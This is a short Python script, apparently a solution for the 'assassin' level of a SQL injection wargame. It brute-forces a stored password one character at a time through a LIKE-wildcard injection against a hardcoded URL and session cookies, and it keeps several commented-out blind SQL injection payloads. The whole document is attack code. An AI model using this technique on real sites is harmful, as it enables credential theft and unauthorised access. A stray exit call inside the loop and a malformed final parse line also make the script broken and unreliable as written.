import requests
from bs4 import BeautifulSoup

URL="http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?"
cookie={
    "__cfduid":"d33f226e52742a4101c7fa523b51564201526036891",
    "PHPSESSID":"u3lic0rsj39ldqe5gktriat692"
    }
session1=requests.Session()
pw = ""
for i in range(8):
    for j in range(48,127):
        data='pw='+pw+chr(j)+'%25'
        #data ='pw=1&no=1||(id<"b")%26%26(left(pw,"'+str(i+1)+'")<"'+pw+chr(j)+'")'
        #data ='pw=1&no=1 or id<"b" and left(pw,'+str(i+1)+')<"'+pw+chr(j)+'"'
        #data ="pw=1'|| id<'b' %26%26 mid(pw,"+str(i+1)+",1)<'"+chr(j)
        req1=session1.get(URL+data,cookies=cookie)
        soup = BeautifulSoup(req1.text,'html5lib')
        print (soup.prettify())
        exit (0)
        if req1.text.find("Hello guest") > -1 :
            pw = pw+chr(j)
            print (pw)
            break
        if req1.text.find("Hello admin") > -1 :
            pw = pw+chr(j)
            print (pw)
            break
print ("password : "+pw+" or "+pw.lower())
req2=session1.get(URL+"pw="+pw,cookies=cookie)
req2=session1.get(URL+"pw="+pw.lower(),cookies=cookie)
soup = (req2.text,'css')
print (soup)
